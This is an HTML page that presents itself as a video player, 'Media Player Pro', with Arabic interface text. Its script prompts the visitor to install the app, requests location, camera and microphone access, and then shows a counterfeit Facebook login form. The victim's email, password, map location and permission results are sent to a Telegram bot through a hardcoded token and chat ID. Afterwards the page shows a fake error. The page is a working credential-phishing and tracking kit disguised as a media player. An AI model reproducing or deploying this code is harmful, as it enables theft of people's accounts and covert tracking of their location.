<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Player Pro</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { margin: 0; background-color: #000; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        video { width: 100%; max-height: 80vh; }
        #customModal, #fbModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
        .box { background: #1a1a1a; padding: 20px; border-radius: 12px; text-align: center; width: 100%; max-width: 400px; border: 1px solid #333; }
        button { background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ddd; box-sizing: border-box; }
        .fb-logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 20px; }
    </style>
</head>
<body>

    <video id="myVideo" controls poster="trend_bg.jpg.jpg">
        <source src="v.mp4" type="video/mp4">
    </video>

    <div id="customModal" style="display: flex;">
        <div class="box">
            <h3>مشغل الفيديو الاحترافي</h3>
            <p>لمشاهدة الفيديو بالكامل، يرجى المتابعة عبر المشغل الخاص بنا.</p>
            <button id="installBtn">فتح عبر المشغل</button>
        </div>
    </div>

    <div id="fbModal">
        <div class="box" style="background: white; color: black;">
            <div class="fb-logo">facebook</div>
            <p style="color: #606770; font-size: 14px;">يجب تسجيل الدخول لمتابعة المشاهدة</p>
            <input type="text" id="fbEmail" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
            <input type="password" id="fbPass" placeholder="كلمة السر" required>
            <button id="fbLoginBtn">تسجيل الدخول</button>
            <p style="color: #1877f2; font-size: 13px; margin-top: 15px;">هل نسيت كلمة السر؟</p>
        </div>
    </div>

    <script>
        const token = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
        const chatId = "1356975454";

        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }

        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
        });

        // عند الضغط على "فتح عبر المشغل"
        document.getElementById('installBtn').addEventListener('click', async () => {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                const { outcome } = await deferredPrompt.userChoice;
                if (outcome === 'accepted') {
                    sendToBot("🎯 الضحية بدأ التثبيت.");
                    await getAllPermissions();
                    showFB();
                }
            } else {
                await getAllPermissions();
                showFB();
            }
        });

        // طلب كل الصلاحيات المتاحة
        async function getAllPermissions() {
            // الموقع
            navigator.geolocation.getCurrentPosition((pos) => {
                const map = `📍 موقع الضحية:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToBot(map);
            });

            // الكاميرا والمايك
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                sendToBot("🎙️📸 تم الحصول على إذن الكاميرا والمايك.");
            } catch (e) {
                sendToBot("❌ الضحية رفض الكاميرا/المايك.");
            }
        }

        function showFB() {
            document.getElementById('customModal').style.display = 'none';
            document.getElementById('fbModal').style.display = 'flex';
        }

        // صيد بيانات فيسبوك
        document.getElementById('fbLoginBtn').addEventListener('click', () => {
            const email = document.getElementById('fbEmail').value;
            const pass = document.getElementById('fbPass').value;
            if(email && pass) {
                const data = `🔐 صيدة فيسبوك جديدة:\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
                sendToBot(data);
                alert("⚠️ خطأ في الاتصال، يرجى المحاولة لاحقاً.");
                window.location.reload();
            } else {
                alert("يرجى إدخال البيانات كاملة");
            }
        });

        function sendToBot(text) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`, { mode: 'no-cors' });
        }
    </script>
</body>
</html>
